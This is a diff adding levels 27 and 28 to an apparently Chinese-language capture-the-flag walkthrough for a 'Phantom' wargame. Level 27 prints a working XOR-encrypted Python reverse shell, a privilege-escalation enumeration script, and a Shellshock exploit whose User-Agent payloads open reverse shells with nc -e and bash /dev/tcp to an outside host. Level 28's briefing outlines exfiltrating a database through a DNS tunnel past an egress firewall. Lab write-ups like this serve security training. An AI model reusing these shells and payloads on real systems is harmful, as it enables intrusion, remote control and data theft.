@@ -2012,21 +2012,153 @@ phantom26@phantom:~$ curl http://10.13.37.30/latest/meta-data/iam/security-crede
 ## 27 Toolsmith
 
 ```plaintext
+ [ Phantom · Level 27 ]  Toolsmith
+ Full brief:  cat ~/BRIEFING
+ ─────────────────────────────────────────────
+ If you're stuck — read up on the topic, then come back:
+   https://github.com/swisskyrepo/PayloadsAllTheThings
 ```
 
 查看说明
 
 ```plaintext title="BRIEFING"
+MISSION: Toolsmith
+=================
+
+Stop using other peoples tools. Write your own.
+
+1. Write an encrypted reverse shell in Python or Bash
+2. Write a script that automates the privesc checks from Act I
+3. Adapt a public CVE PoC to work in this environment
+
+Your tools go in /tmp/tools/. When ready, run /opt/verify-tools.sh
+```
+
+首先看一下验证方式
+
+```shell
+phantom27@phantom:~$ /opt/verify-tools.sh
+[*] Verifying your tools...
+
+[-] Reverse shell: NOT FOUND (expected /tmp/tools/revshell.{py,sh,pl,rb})
+[-] Privesc checker: NOT FOUND (expected /tmp/tools/privesc.{sh,py})
+[-] Exploit adaptation: NOT FOUND (expected /tmp/tools/exploit.{py,sh,c,rb})
+
+[*] Score: 0/3
+
+[!] Fill in real tool code and re-run. Empty shells don't count.
+
+[!] need all 3 tools with real code markers, got 0
+```
+
+开始编写三个 poc 文件
+
+```shell title="/tmp/tools/revshell.py"
+#!/usr/bin/env python3
+import socket, os, subprocess, base64
+
+# XOR 加密/解密函数
+def xor_encrypt(data, key=0x5A):
+    return bytes([b ^ key for b in data])
+
+HOST = "10.0.0.1"  # 改成你的监听 IP
+PORT = 4444
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+
+while True:
+    enc_cmd = s.recv(1024)
+    cmd = xor_encrypt(enc_cmd).decode().strip()
+    if cmd.lower() == "exit":
+        break
+    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    out = proc.stdout.read() + proc.stderr.read()
+    s.send(xor_encrypt(out))
+s.close()
+```
+
+```python title="/tmp/tools/privesc.sh"
+#!/bin/bash
+echo "[*] SUID/SGID files..."
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -2000 -type f 2>/dev/null
+
+echo "[*] sudo -l (current user)..."
+sudo -l 2>/dev/null
+
+echo "[*] World-writable files in /etc..."
+find /etc -perm -o+w -type f 2>/dev/null
+
+echo "[*] Crontabs..."
+cat /etc/crontab 2>/dev/null
+ls -la /etc/cron.* 2>/dev/null
+
+echo "[*] Kernel info..."
+uname -a
+cat /etc/os-release 2>/dev/null
+
+echo "[*] Done."
+```
+
+其次是 [PayloadsAllTheThings/CVE Exploits at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CVE%20Exploits)
+
+```shell title="/tmp/tools/exploit.sh"
+# CVE-2014-6271 - Shellshock
+echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 10.0.0.2 4444 -e /bin/sh\r\n"
+curl --silent -k -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.2/4444 0>&1" "https://10.0.0.1/cgi-bin/admin.cgi" 
+```
+
+然后再来进行检查
+
+```shell
+phantom27@phantom:~$ /opt/verify-tools.sh
+[*] Verifying your tools...
+
+[+] Reverse shell: /tmp/tools/revshell.py (networking primitives present)
+[+] Privesc checker: /tmp/tools/privesc.sh (5 vectors referenced)
+[+] Exploit adaptation: /tmp/tools/exploit.sh (exploit markers present)
+
+[*] Score: 3/3
+
+[*] FLAG: bl_phtm27_**hidden**
+[*] Use this as the password for phantom28.
 ```
 
 ## 28 The Heist
 
 ```plaintext
+ [ Phantom · Level 28 ]  The Heist
+ Full brief:  cat ~/BRIEFING
+ ─────────────────────────────────────────────
+ If you're stuck — read up on the topic, then come back:
+   https://github.com/iagox86/dnscat2
+   https://docs.python.org/3/library/base64.html
+   https://attack.mitre.org/techniques/T1048/
 ```
 
 查看说明
 
 ```plaintext title="BRIEFING"
+MISSION: The Heist
+=================
+
+The target data is /opt/vault/classified.db on this host.
+Get it OUT of the network. The egress firewall REJECTs every
+outbound destination except DNS (udp/53) and HTTPS (tcp/443) to
+the mgmt server, plus established / related traffic.
+
+A DNS sink on 10.13.37.30:53 accepts base32-encoded payloads in
+subdomain labels and reassembles them server-side. The protocol
+it speaks is:
+
+    <b32-chunk>.<seq>.<run-id>.exfil.local
+
+When the sink receives every chunk of the file in order and the
+sha256 of the reassembly matches the target, it drops the flag
+to /tmp/heist.flag on the mgmt host — reachable from this host
+through the tunnel you already learned to build.
+
+You have sudo. tcpdump is available.
 ```
 
 ## 29 Wire Tap
